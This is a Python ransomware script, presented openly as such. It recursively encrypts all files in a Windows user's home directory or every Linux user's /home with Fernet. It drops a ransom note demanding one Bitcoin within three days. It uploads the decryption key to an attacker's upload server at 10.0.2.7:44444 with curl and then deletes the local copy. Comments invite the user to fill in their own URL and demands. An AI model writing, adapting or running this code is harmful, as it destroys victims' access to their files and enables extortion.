#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Immobilize and demand candy is the primary purpose of this code. Test in lab first?
# It recusively gathers all of the files in the user's home dir (or /home dir if on Linux) and stores in f.
# Works on Linux and Windows. Note: Windows requires python3 installation to work.
# In console output message will be displayed as well as the files to be changed.
# Use in conjunction with UploadServer python module for post decryption.
# The python3 uploadserver will be ran from your device and not the victim (default port: 44444).
# In 10 seconds or so the entry.k (key) will be moved to python3 uploadserver and deleted. Also, user will be notified via text file.
# Update URLs and demands below!!!
# Note: entry.k retrieval is crucial and it's the key used in reveal.py to decrypt files.
# If entry.k is lost, files may not be recoverable so, recover from python3 uploadserver. Use at own risk :)
# Tested on Ubuntu, RedHat, and Windows 11. Note: May have to run twice on Redhat if missing packages.
# Windows on affects the logged in user. Linux affects all users' in /home.
# Windows(non-privileged): python3 .\3rawm05nar.py
# Linux(privileged): sudo python3 3rawm05nar.py

# Import libraries

import platform
import os
import subprocess
import time
import sys

# Two global variables

f = []

# Change to your terms

stmt = \
    "'Recover data locating the HOTreadME.txt in the directory where payload was initiated. The message reads, send 1 Bitcoin to the following address:  . You have 3 days to send Bitcoin before the key is permanently deleted. Tick-Tock...Tick-Tock...'"
    
# Try to see if module is present, if not, install packages and rerun 3rawm05nar.py on Windows. For Linux code may have to be ran again due to missing packages.

try:

    from cryptography.fernet import Fernet

except:

# Install crypto on the correct os

    if platform.system() == 'Windows':
    
        subprocess.Popen("powershell.exe start powershell -argumentlist 'pip3 install cryptography'")
        exec(open("3rawm05nar.py").read())
        
    elif platform.system() == 'Linux':
    
        os.system('yum install python3-pip -y')
        r = 'cryptography'
        
        if not r in sys.modules:
        
            os.system('pip3 install cryptography')
else:

    os.system('apt install curl -y')

# Move Encryption Key to attacker server and notify user via text file

def move():

    # Please catch the exception

    try:
    
        text_file = open('HOTreadME.txt', 'w+')
        n = text_file.write(stmt)
        text_file.close()
        
    except:
    
        print('An error occured!')

    # if windows do this, if linux do this. Send entry.k to your server and notify user.

    if platform.system() == 'Windows':

        # Add appropriate URL below

        str1 = \
            'powershell.exe curl.exe -i -F files=@entry.k http://10.0.2.7:44444/upload'
        str2 = 'powershell.exe notepad HOTreadME.txt' # Notify User
        cmd = (str1, str2)

        for c in cmd:
        
            subprocess.Popen(c)
            
    elif platform.system() == 'Linux':

        # Add appropriate URL below
            
        str3 = 'curl -X POST http://10.0.2.7:44444/upload -F files=@entry.k'
        os.system(str3)

    # Sleep a bit and remove that key promptly

    time.sleep(10)
    os.remove('entry.k')
    if platform.system() == 'Linux':
        os.system('gedit HOTreadME.txt')


# Try to crypt the files up

def payformance(thek):

    for x in f:
        try:
            with open(x, 'rb') as d:
                info = d.read()
            info_cry = Fernet(thek).encrypt(info)
            with open(x, 'wb') as thex:
                thex.write(info_cry)
        except PermissionError:
            continue
        except FileNotFoundError:
            continue
        except:
            continue
    move()

# Recursively gather all files in the user's home or users' /home dir and store in f.

def payform():

    dir = os.path.expanduser('~')
    
    if platform.system() == 'Windows':
        # User's home dir start finding files
    
        for (subdir, dirs, files) in os.walk(dir):
            for x in files:

            # Very important! "DO NOT ENCRYPT THESE BELOW FILES" or it will end poorly.

                if x == '3rawm05nar.py' or x == 'entry.k' or x \
                    == 'reveal.py' or x == 'HOTreadME.txt':
                    continue
                y = os.path.join(subdir, x)
                if os.path.isfile(y):
                    f.append(y)
                    
    elif platform.system() == 'Linux':
        # Users' /home dir start finding files
        for (subdir, dirs, files) in os.walk('/home'):
            for x in files:

            # Very important! "DO NOT ENCRYPT THESE BELOW FILES" or it will end poorly.

                if x == '3rawm05nar.py' or x == 'entry.k' or x \
                    == 'reveal.py' or x == 'HOTreadME.txt':
                    continue
                y = os.path.join(subdir, x)
                if os.path.isfile(y):
                    f.append(y)

    # If ran from the commandline window, it will display message here as well as files to be changed. 

    print('')
    print(stmt)
    print('')
    print(f)
    access()

# Create the Key

def access():

    k = Fernet.generate_key()

    # Write key to File

    with open('entry.k', 'wb') as entry:
        entry.write(k)
    payformance(k)

# Main call

if __name__ == '__main__':

    payform()
